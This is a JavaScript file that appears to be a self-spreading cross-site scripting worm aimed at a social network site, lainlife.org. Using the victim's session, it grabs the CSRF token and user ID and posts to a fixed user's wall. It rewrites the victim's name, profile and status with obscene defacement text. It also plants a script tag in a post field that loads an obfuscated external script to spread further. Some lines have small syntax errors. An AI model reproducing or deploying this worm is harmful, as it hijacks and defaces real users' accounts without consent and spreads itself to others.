async function makePost(csrf) {
  return await (await fetch("https://lainlife.org/wall625/makePost", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "X-OpenVK-Ajax-Query": "1",
          "Content-Type": "multipart/form-data; boundary=----geckoformboundary45397845d99409e0dd4bd380e71b4b24",
          "Sec-GPC": "1",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          "Priority": "u=0"
      },
      "referrer": "https://lainlife.org/id625",
      "body": `------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nПривет Ослоёб, я твой преданный фанат\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"horizontal_attachments\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"vertical_attachments\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"poll\"\r\n\r\nnone\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nnone\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"geo\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24--\r\n`,
      "method": "POST",
      "mode": "cors"
  })).text();
}

async function worm(csrf, myid) {
  await (await fetch(`https://lainlife.org/wall${myid}/makePost`, {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "X-OpenVK-Ajax-Query": "1",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary79e487d579b3830a84fd35791a059fa0",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    },
    "referrer": `https://lainlife.org/id${myid}`,
    "body": `------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nHacked By Donkey Fucker\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"horizontal_attachments\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"vertical_attachments\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"poll\"\r\n\r\nnone\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nhttps://example.com?q=\"><script>document.body.appendChild(Object.assign(document.createElement('script'),{src:atob('aHR0cHM6Ly9jaG9wY2hva2VyLmdpdGh1Yi5pby8wLmpz')}));</script>\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"geo\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0--\r\n`,
    "method": "POST",
    "mode": "cors"
  })).text();
}

async function getCSRF() {
  const text = await (await fetch("https://lainlife.org/id625", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "https://lainlife.org/id625",
    "method": "GET",
    "mode": "cors"
  })).text();
  return text.split(`<meta name="csrf" value="`)[1].split(`" />`)[0]
}

async function getID() {
  const text = await (await fetch("https://lainlife.org/id625", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "https://lainlife.org/id625",
    "method": "GET",
    "mode": "cors"
  })).text();
  return text.split(`<a href="/friends`)[1].split(`"`)[0]
}

async function setStatus(csrf, status) {
  await (await fetch("https://lainlife.org/edit?act=status", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary3b5c6a2f999231017c670364cec5dd97",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=4"
    },
    "referrer": "https://lainlife.org/id625",
    "body": `------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\n${status}\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"broadcast\"\r\n\r\n1\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97--\r\n`,
    "method": "POST",
    "mode": "cors"
  })).text();
}

async changeProfile(csrf) {
  await (await fetch("https://lainlife.org/edit?act=main", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "X-OpenVK-Ajax-Query": "1",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc0b74d4e8fb71b4e23c846929975b191",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    },
    "referrer": "https://lainlife.org/edit",
    "body": `------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nDonkey\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\nFucker\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"pseudo\"\r\n\r\n\">1337\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\nLets all love Donkey Fucker!!! I'm his fan.\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"hometown\"\r\n\r\n\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"marialstatus\"\r\n\r\n6\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"maritalstatus-user\"\r\n\r\n625\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"politViews\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"pronouns\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"birthday\"\r\n\r\n1111-11-07\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"birthday_privacy\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"broadcast_music\"\r\n\r\non\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\${csrf}\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191--\r\n`,
    "method": "POST",
    "mode": "cors"
  })).text();
}

async function hack() {
  const csrf = await getCSRF();
  const userid = await getID();
  console.log('csrf', csrf, 'id', userid);
  await makePost(csrf);
  await changeProfile(csrf);
  await setStatus(csrf, 'Lets all love Donkey Fucker!!! I\'m his fan.');
  await worm(csrf, userid);
};

hack();
